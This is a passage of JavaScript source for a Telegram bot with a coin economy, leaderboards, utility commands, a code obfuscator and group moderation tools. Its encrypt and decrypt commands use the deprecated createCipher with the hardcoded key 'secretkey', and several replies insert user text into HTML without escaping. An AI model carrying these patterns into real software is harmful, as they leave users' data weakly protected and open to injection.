    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.usedHacks} hacks\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_obfuscators", async (ctx) => {
  const topUsers = getLeaderboard('obfuscations', 10);
  let message = "🏆 **🔒 TOP CODE OBFUSCATORS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.obfuscationsUsed || 0} obfuscations\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("coin_leaderboard", async (ctx) => {
  const topUsers = getLeaderboard('coins', 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("game_leaderboard", async (ctx) => {
  const topUsers = getLeaderboard('games', 10);
  let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.gamesWon} wins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// ========== REFERRAL INFO ==========
bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = getReferralLink(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🔗 REFERRAL SYSTEM     ║
╚══════════════════════════╝

<b>Your Referral Link:</b>
<code>${link}</code>

<b>📊 Your Stats:</b>
• Referrals: ${user.referrals}
• Coins Earned: ${user.referrals * REFERRAL_REWARD}
• Total Coins: ${user.coins}

<b>🎁 Rewards:</b>
• ${REFERRAL_REWARD} coins per referral
• 🏆 "Recruiter" badge at 10 referrals
• 💎 Bonus 20 coins at 25 referrals
• 👑 "Elite Referrer" at 50 referrals

<i>Share your link and earn coins!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== ECONOMY ==========
bot.action("economy_menu", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  💰 ECONOMY SYSTEM      ║
╚══════════════════════════╝

💰 <b>Your Balance:</b> ${user.coins} coins
🏦 <b>Bank:</b> ${user.bank} coins
📈 <b>Total Earned:</b> ${user.totalEarned}

<b>💰 Earning Methods:</b>
• Daily reward - ${DAILY_REWARD} coin
• Work - ${WORK_MIN}-${WORK_MAX} coins
• Referrals - ${REFERRAL_REWARD} coins each
• Games - Hard win rates!
• Redeem codes

⬇️ <b>Select option:</b>
  `), { parse_mode: "HTML", ...economyMenu() });
});

bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && (now - user.lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.reply(`⏰ Daily reward already claimed! Come back in ${hours} hours.`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && (now - user.lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const bonus = Math.min(streak, 10);
  const totalReward = DAILY_REWARD + bonus;
  
  addCoins(ctx.from.id, totalReward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 DAILY REWARD! 🎁    ║
╚══════════════════════════╝

💰 <b>You received:</b> <code>+${totalReward} COINS</code>

📊 <b>Breakdown:</b>
• Base: ${DAILY_REWARD}
• Streak Bonus: +${bonus}

🔥 <b>Current Streak:</b> ${streak} day(s)

💎 <b>New Balance:</b> ${user.coins + totalReward} coins

<i>Come back tomorrow for more!</i>
  `), { parse_mode: "HTML" });
});

bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const remaining = 3600000 - (now - lastWork);
    const minutes = Math.ceil(remaining / 60000);
    return ctx.reply(`⏰ You're tired! Rest for ${minutes} minutes before working again.`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper", "🍕 Delivery", "📚 Teacher", "🔧 Mechanic"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💼 WORK COMPLETE! 💼   ║
╚══════════════════════════╝

👔 <b>Job:</b> ${job}
💰 <b>Payment:</b> <code>+${reward} COINS</code>

💎 <b>New Balance:</b> ${users.get(userId).coins} coins

<i>Come back in 1 hour for another shift!</i>
  `), { parse_mode: "HTML" });
});

// ========== PROFILE & STATS ==========
bot.action("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  👤 USER PROFILE        ║
╚══════════════════════════╝

<b>📝 Basic Info:</b>
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: <code>${ctx.from.id}</code>

<b>💰 Economy:</b>
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>📊 Stats:</b>
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L (${user.gamesPlayed} total)
• Code Obfuscations: ${user.obfuscationsUsed || 0}

<b>🏆 Badges:</b>
${user.badges.map(b => `• ${b}`).join('\n')}

<i>🎯 Keep playing to earn more rewards!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "profile")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

bot.action("stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 BOT STATISTICS      ║
╚══════════════════════════╝

<b>🤖 Bot Stats:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor((Date.now() - botStats.startTime) / 86400000)} days
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Referrals: ${botStats.totalReferrals}
• Total Hacks Used: ${botStats.totalHacksUsed}
• Total Redeems: ${botStats.totalRedeems}
• Total Obfuscations: ${botStats.totalObfuscations}

<b>👤 Your Stats:</b>
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== REDEEM SYSTEM ==========
bot.action("redeem_menu", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 REDEEM CODE        ║
╚══════════════════════════╝

<b>Enter your redeem code:</b>

Type: <code>/redeem YOUR_CODE</code>

━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Get codes from:
• Giveaways
• Events
• Support channel</i>
  `), { parse_mode: "HTML" });
});

bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /redeem <CODE>");
  }
  
  const code = args[1];
  const result = redeemCode(ctx.from.id, code);
  
  if (result.success) {
    const user = users.get(ctx.from.id);
    await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ✅ REDEEM SUCCESS!     ║
╚══════════════════════════╝

🎉 ${result.message}

💰 <b>New Balance:</b> ${user.coins} coins
    `), { parse_mode: "HTML" });
  } else {
    await ctx.reply(result.message);
  }
});

// ========== DEV TOOLS ==========
bot.action("devtools_menu", async (ctx) => {
  await ctx.editMessageCaption("🛠 DEV TOOLS & UTILITIES\n\nProfessional tools for developers and tech enthusiasts!\n\n🔒 Obfuscate - Protect your JavaScript code\n🗜️ Minify - Compress your code\n✅ Validate - Check syntax errors", {
    parse_mode: "HTML",
    ...devToolsMenu()
  });
});

// OBFUSCATE CODE
bot.action("obfuscate_code", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  🔒 CODE OBFUSCATOR                     ║
╚══════════════════════════════════════════╝

<b>Send your JavaScript code to obfuscate:</b>

<i>Features:</i>
• Variable name randomization
• String encoding (Base64)
• Comment removal
• Anti-debug protection
• Code compression

<i>Example:</i>
<code>function hello() {
    console.log("Hello World");
}</code>

⚠️ <i>Send code as a single message</i>
  `), { parse_mode: "HTML" });
  
  const user = initUser(ctx.from.id);
  user.waitingForObfuscation = true;
  users.set(ctx.from.id, user);
});

// MINIFY CODE
bot.action("minify_code", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  🗜️ CODE MINIFIER                       ║
╚══════════════════════════════════════════╝

<b>Send your JavaScript code to minify:</b>

<i>Minification removes:</i>
• Comments
• Extra whitespace
• Unnecessary characters

⚠️ <i>Send code as a single message</i>
  `), { parse_mode: "HTML" });
  
  const user = initUser(ctx.from.id);
  user.waitingForMinify = true;
  users.set(ctx.from.id, user);
});

// VALIDATE CODE
bot.action("validate_code", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  ✅ CODE VALIDATOR                      ║
╚══════════════════════════════════════════╝

<b>Send your JavaScript code to validate:</b>

<i>Checks for:</i>
• Syntax errors
• Valid JavaScript structure

⚠️ <i>Send code as a single message</i>
  `), { parse_mode: "HTML" });
  
  const user = initUser(ctx.from.id);
  user.waitingForValidate = true;
  users.set(ctx.from.id, user);
});

// ENCRYPT
bot.action("encrypt", async (ctx) => {
  await ctx.reply("🔐 Send text to encrypt:\nUse: `/encrypt your text here`", { parse_mode: "HTML" });
});

bot.command("encrypt", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /encrypt <text>");
  
  const cipher = crypto.createCipher("aes-256-cbc", "secretkey");
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  
  await ctx.reply(`🔐 Encrypted:\n<code>${encrypted}</code>`, { parse_mode: "HTML" });
});

// DECRYPT
bot.action("decrypt", async (ctx) => {
  await ctx.reply("🔓 Send hex to decrypt:\nUse: `/decrypt your_hex_code`", { parse_mode: "HTML" });
});

bot.command("decrypt", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /decrypt <hex>");
  
  try {
    const decipher = crypto.createDecipher("aes-256-cbc", "secretkey");
    let decrypted = decipher.update(text, "hex", "utf8");
    decrypted += decipher.final("utf8");
    await ctx.reply(`🔓 Decrypted:\n${decrypted}`);
  } catch {
    await ctx.reply("❌ Invalid encrypted text!");
  }
});

// BASE64
bot.action("base64", async (ctx) => {
  await ctx.reply("📝 Send text to encode to Base64:\nUse: `/base64 your text here`", { parse_mode: "HTML" });
});

bot.command("base64", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /base64 <text>");
  
  const encoded = Buffer.from(text).toString("base64");
  await ctx.reply(`📝 Base64:\n<code>${encoded}</code>`, { parse_mode: "HTML" });
});

// HASH
bot.action("hash", async (ctx) => {
  await ctx.reply("🔢 Generate hash:\nUse: `/hash md5 text` or `/hash sha256 text`", { parse_mode: "HTML" });
});

bot.command("hash", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const type = args[1]?.toLowerCase();
  const text = args.slice(2).join(" ");
  
  if (!type || !text) return ctx.reply("Usage: /hash <md5/sha256/sha512> <text>");
  
  let hash;
  if (type === "md5") hash = crypto.createHash("md5").update(text).digest("hex");
  else if (type === "sha256") hash = crypto.createHash("sha256").update(text).digest("hex");
  else if (type === "sha512") hash = crypto.createHash("sha512").update(text).digest("hex");
  else return ctx.reply("Invalid hash type. Use: md5, sha256, sha512");
  
  await ctx.reply(`🔢 ${type.toUpperCase()} Hash:\n<code>${hash}</code>`, { parse_mode: "HTML" });
});

// TIMESTAMP
bot.action("timestamp", async (ctx) => {
  const now = Math.floor(Date.now() / 1000);
  await ctx.reply(`⏰ Current timestamp: <code>${now}</code>\n📅 Date: ${new Date().toLocaleString()}`, { parse_mode: "HTML" });
});

// RANDOM
bot.action("random", async (ctx) => {
  await ctx.reply("🎲 Send range: `/random min max`\nExample: `/random 1 100`", { parse_mode: "HTML" });
});

bot.command("random", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const min = parseInt(args[1]) || 1;
  const max = parseInt(args[2]) || 100;
  
  const random = Math.floor(Math.random() * (max - min + 1)) + min;
  await ctx.reply(`🎲 Random number between ${min}-${max}: <code>${random}</code>`, { parse_mode: "HTML" });
});

// NOTE
bot.action("note", async (ctx) => {
  await ctx.reply("📋 Save a note:\nUse: `/note save your note here`\nView notes: `/note list`\nDelete: `/note delete 1`", { parse_mode: "HTML" });
});

bot.command("note", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const action = args[1];
  
  if (action === "save") {
    const note = args.slice(2).join(" ");
    if (!note) return ctx.reply("Usage: /note save <your note>");
    user.notes.push({ id: Date.now(), text: note, date: new Date() });
    users.set(ctx.from.id, user);
    await ctx.reply(`✅ Note saved!`);
  } else if (action === "list") {
    if (!user.notes.length) return ctx.reply("No notes saved.");
    let notes = "📋 **Your Notes:**\n\n";
    user.notes.forEach((note, i) => {
      notes += `${i+1}. ${note.text}\n`;
    });
    await ctx.reply(notes, { parse_mode: "Markdown" });
  } else if (action === "delete") {
    const index = parseInt(args[2]) - 1;
    if (isNaN(index) || !user.notes[index]) return ctx.reply("Invalid note number.");
    user.notes.splice(index, 1);
    users.set(ctx.from.id, user);
    await ctx.reply("✅ Note deleted!");
  }
});

// REMINDER
bot.action("reminder", async (ctx) => {
  await ctx.reply("⏰ Set a reminder:\nUse: `/reminder 10m Your message`\n\nTime formats: 10m, 1h, 2d", { parse_mode: "HTML" });
});

bot.command("reminder", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const timeStr = args[1];
  const message = args.slice(2).join(" ");
  
  if (!timeStr || !message) return ctx.reply("Usage: /reminder 10m Your message");
  
  let seconds = 0;
  if (timeStr.endsWith("m")) seconds = parseInt(timeStr) * 60;
  else if (timeStr.endsWith("h")) seconds = parseInt(timeStr) * 3600;
  else if (timeStr.endsWith("d")) seconds = parseInt(timeStr) * 86400;
  else return ctx.reply("Invalid time format. Use: 10m, 1h, 2d");
  
  setTimeout(async () => {
    await ctx.reply(`⏰ REMINDER: ${message}`);
  }, seconds * 1000);
  
  await ctx.reply(`✅ Reminder set for ${timeStr}!`);
});

// AFK
bot.action("afk", async (ctx) => {
  await ctx.reply("💤 Set AFK status:\nUse: `/afk I'm sleeping`", { parse_mode: "HTML" });
});

bot.command("afk", async (ctx) => {
  const user = initUser(ctx.from.id);
  const message = ctx.message.text.split(" ").slice(1).join(" ") || "AFK";
  user.afk = { message, time: Date.now() };
  users.set(ctx.from.id, user);
  await ctx.reply(`💤 You are now AFK: ${message}`);
});

// WHOIS
bot.action("whois", async (ctx) => {
  await ctx.reply("🔍 Get user info:\nUse: `/whois @username` or reply to a message", { parse_mode: "HTML" });
});

bot.command("whois", async (ctx) => {
  let target;
  const reply = ctx.message.reply_to_message;
  const args = ctx.message.text.split(" ");
  
  if (reply) {
    target = reply.from;
  } else if (args[1]) {
    const username = args[1].replace("@", "");
    try {
      const chat = await ctx.telegram.getChat(username);
      target = chat;
    } catch {
      return ctx.reply("User not found!");
    }
  } else {
    target = ctx.from;
  }
  
  await ctx.reply(formatMessage(`
🔍 **USER INFO**

👤 Name: ${target.first_name} ${target.last_name || ''}
🆔 ID: <code>${target.id}</code>
🔗 Username: @${target.username || 'None'}
🤖 Bot: ${target.is_bot ? 'Yes' : 'No'}
  `), { parse_mode: "HTML" });
});

// SYSTEM INFO
bot.action("system_info", async (ctx) => {
  const uptime = Date.now() - botStats.startTime;
  const uptimeDays = Math.floor(uptime / 86400000);
  const uptimeHours = Math.floor((uptime % 86400000) / 3600000);
  
  await ctx.reply(formatMessage(`
📊 **SYSTEM INFORMATION**

🤖 Bot:
• Version: ${BOT_VERSION}
• Uptime: ${uptimeDays}d ${uptimeHours}h
• Users: ${botStats.totalUsers}
• Groups: ${botStats.totalGroups}

💻 Server:
• Platform: ${process.platform}
• Node: ${process.version}
• Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB

📈 Stats:
• Commands: ${botStats.totalCommands}
• Messages: ${botStats.totalMessages}
• Hacks: ${botStats.totalHacksUsed}
• Obfuscations: ${botStats.totalObfuscations}
  `), { parse_mode: "HTML" });
});

// ========== GROUP ADMIN COMMANDS ==========
bot.action("group_menu", async (ctx) => {
  await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
    parse_mode: "HTML",
    ...groupMenu()
  });
});

// TAG ALL
bot.action("tagall", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return ctx.reply("❌ Group only!");
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) {
    return ctx.reply("❌ Admin only!");
  }
  
  const now = Date.now();
  const lastTag = tagAllCooldown.get(ctx.chat.id) || 0;
  if (now - lastTag < 300000) {
    const minutes = Math.ceil((300000 - (now - lastTag)) / 60000);
    return ctx.reply(`⏰ Please wait ${minutes} minutes before using tag all again!`);
  }
  
  await ctx.reply("🔊 **Tagging members...**", { parse_mode: "Markdown" });
  
  try {
    const admins = await ctx.getChatAdministrators();
    let mentions = "";
    
    for (const admin of admins.slice(0, 50)) {
      mentions += `[@${admin.user.username || admin.user.first_name}](tg://user?id=${admin.user.id}) `;
    }
    
    await ctx.reply(`📢 **Announcement from Admin**\n\n${mentions}`, { parse_mode: "Markdown" });
    tagAllCooldown.set(ctx.chat.id, now);
  } catch (err) {
    ctx.reply("❌ Failed to tag members. Make sure I'm admin!");
  }
});

// SET WELCOME
bot.action("set_welcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  
  await ctx.reply("📝 Send the welcome message you want to set.\n\nUse: `/setwelcome Your welcome message here`\n\nVariables: {name} - user's name, {group} - group name");
});

bot.command("setwelcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /setwelcome <message>");
  
  welcomeMessages.set(ctx.chat.id, message);
  await ctx.reply(`✅ Welcome message set!\n\n${message}`);
});

// SET GOODBYE
bot.action("set_goodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("❌ Admin only!");
  
  await ctx.reply("📝 Send the goodbye message you want to set.\n\nUse: `/setgoodbye Your goodbye message here`");
});

bot.command("setgoodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /setgoodbye <message>");
  
  goodbyeMessages.set(ctx.chat.id, message);
  await ctx.reply(`✅ Goodbye message set!\n\n${message}`);
});

// WELCOME MESSAGE HANDLER
bot.on("new_chat_members", async (ctx) => {
  const welcomeMsg = welcomeMessages.get(ctx.chat.id);
  if (!welcomeMsg) return;
  
  for (const member of ctx.message.new_chat_members) {
    if (member.id === bot.botInfo.id) continue;
    
    const text = welcomeMsg
      .replace("{name}", member.first_name)
      .replace("{group}", ctx.chat.title);
    
    await ctx.reply(text);
  }
});

// GOODBYE MESSAGE HANDLER
bot.on("left_chat_member", async (ctx) => {
  const goodbyeMsg = goodbyeMessages.get(ctx.chat.id);
  if (!goodbyeMsg) return;
  
  const member = ctx.message.left_chat_member;
  if (member.id === bot.botInfo.id) return;
  
  const text = goodbyeMsg
    .replace("{name}", member.first_name)
    .replace("{group}", ctx.chat.title);
  
  await ctx.reply(text);
});

// WARN
bot.action("warn_user", async (ctx) => {
  await ctx.reply("⚠️ Reply to a user's message with `/warn` to warn them.\n\n3 warnings = automatic ban!");
});

bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to warn them!");
  
  const userId = reply.from.id;
  const warns = (userWarnings.get(userId) || 0) + 1;
  userWarnings.set(userId, warns);
  
  await ctx.reply(`⚠️ ${reply.from.first_name} warned! (${warns}/3)`);
  
  if (warns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, userId);
    userWarnings.delete(userId);
    await ctx.reply(`🚫 ${reply.from.first_name} banned for 3 warnings!`);
  }
});

// KICK
bot.action("kick_user", async (ctx) => {
  await ctx.reply("🔨 Reply to a user's message with `/kick` to kick them.");
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to kick!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} kicked!`);
});

// BAN
bot.action("ban_user", async (ctx) => {
  await ctx.reply("🚫 Reply to a user's message with `/ban` to ban them.");
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to ban!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
});

// MUTE
bot.action("mute_user", async (ctx) => {
  await ctx.reply("🔇 Reply to a user's message with `/mute <minutes>` to mute them.\nExample: `/mute 30`");
});

bot.command("mute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const args = ctx.message.text.split(" ");
  const minutes = parseInt(args[1]) || 30;
  const reply = ctx.message.reply_to_message;
  
  if (!reply) return ctx.reply("Reply to a user to mute!");
  
  const untilDate = Math.floor(Date.now() / 1000) + (minutes * 60);
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      until_date: untilDate,
      can_send_messages: false
    });
    await ctx.reply(`🔇 ${reply.from.first_name} muted for ${minutes} minutes!`);
  } catch (err) {
    ctx.reply("❌ Failed to mute. Make sure I'm admin!");
  }
});

// UNMUTE
bot.command("unmute", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to unmute!");
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    await ctx.reply(`🔊 ${reply.from.first_name} unmuted!`);
  } catch (err) {
    ctx.reply("❌ Failed to unmute.");
  }
});

// ANTILINK TOGGLE
bot.action("antilink_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  if (antilinkGroups.has(ctx.chat.id)) {
    antilinkGroups.delete(ctx.chat.id);
    await ctx.reply("🚫 Anti-link DISABLED!");
  } else {
    antilinkGroups.add(ctx.chat.id);
    await ctx.reply("✅ Anti-link ENABLED! Links will be deleted.");
  }
});

// ANTISPAM TOGGLE
bot.action("antispam_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  if (antispamGroups.has(ctx.chat.id)) {
    antispamGroups.delete(ctx.chat.id);
    await ctx.reply("🛡️ Anti-spam DISABLED!");
  } else {
    antispamGroups.add(ctx.chat.id);
    await ctx.reply("✅ Anti-spam ENABLED! Spammers will be muted.");
  }
});

// ANTI-LINK & ANTI-SPAM HANDLERS
bot.on("text", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  if (antilinkGroups.has(ctx.chat.id)) {
    const text = ctx.message.text;
    if (text.includes("http://") || text.includes("https://") || text.includes("t.me/") || text.includes("telegram.me")) {
      await ctx.deleteMessage();
      await ctx.reply(`🚫 Links are not allowed! ${ctx.from.first_name}, please don't share links.`);
      return;
    }
  }
  
  if (antispamGroups.has(ctx.chat.id)) {
    const userId = ctx.from.id;
    const now = Date.now();
    const userSpam = antispamUsers.get(userId) || [];
    const recent = userSpam.filter(t => now - t < 5000);
    
    if (recent.length >= 3) {
      await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
        until_date: Math.floor(now / 1000) + 60,
        can_send_messages: false
      });
      await ctx.reply(`🛡️ ${ctx.from.first_name} has been muted for spamming!`);
      antispamUsers.delete(userId);
    } else {
      recent.push(now);
      antispamUsers.set(userId, recent);
    }
  }
});

// GROUP STATS
bot.action("group_stats", async (ctx) => {
  if (!ctx.chat.type?.includes("group")) return;
  
  const chat = await ctx.getChat();
  const admins = await ctx.getChatAdministrators();
  const memberCount = await ctx.telegram.getChatMembersCount(ctx.chat.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 GROUP STATISTICS    ║
╚══════════════════════════╝

<b>📝 Group Info:</b>
• Name: ${chat.title}
• Members: ${memberCount}
• Admins: ${admins.length}

<b>⚙️ Settings:</b>
• Anti-link: ${antilinkGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Anti-spam: ${antispamGroups.has(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Welcome: ${welcomeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Goodbye: ${goodbyeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}

<b>📈 Activity:</b>
• Total warns: ${userWarnings.size}
  `), { parse_mode: "HTML" });
});

// ========== CHAT WITH DEV ==========
bot.command("chat", async (ctx) => {
  activeChats.set(ctx.chat.id, true);
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💬 CHAT MODE ACTIVE    ║
╚══════════════════════════╝

✅ You can now message the developer!

📨 <b>Instructions:</b>
• Send any message
• Dev will reply here
• Type /exit to leave

<i>Response time: Usually within minutes</i>
  `), { parse_mode: "HTML" });
});

bot.command("exit", async (ctx) => {
  if (activeChats.has(ctx.chat.id)) {
    activeChats.delete(ctx.chat.id);
    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

// ========== MESSAGE HANDLER ==========
bot.on("text", async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  if (!msg.text || msg.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  // Check AFK
  const user = users.get(ctx.from.id);
  if (user?.afk) {
    const afkTime = Math.floor((Date.now() - user.afk.time) / 60000);
    await ctx.reply(`💤 ${ctx.from.first_name} is AFK: ${user.afk.message}\n⏱️ ${afkTime} minutes ago`);
    user.afk = null;
    users.set(ctx.from.id, user);
  }
  
  // Handle Obfuscation
  if (user?.waitingForObfuscation) {
    user.waitingForObfuscation = false;
    users.set(ctx.from.id, user);
    
    const code = msg.text;
    if (code.length > 10000) return ctx.reply("❌ Code too long! Maximum 10,000 characters.");
    
    await ctx.reply("🔒 **Obfuscating your code...**", { parse_mode: "Markdown" });
    const result = obfuscateCode(code);
    
    if (result.success) {
      user.obfuscationsUsed = (user.obfuscationsUsed || 0) + 1;
      users.set(ctx.from.id, user);
      botStats.totalObfuscations++;
      
      await ctx.reply(formatMessage(`
╔══════════════════════════════════════════╗
║  ✅ OBFUSCATION COMPLETE!               ║
╚══════════════════════════════════════════╝

<b>📊 Statistics:</b>
• Original Size: ${result.originalLength} chars
• Obfuscated Size: ${result.obfuscatedLength} chars
• Compression: ${result.compression}%

<b>🔒 Obfuscated Code:</b>
<code>${result.obfuscated.substring(0, 3500)}${result.obfuscated.length > 3500 ? '...' : ''}</code>

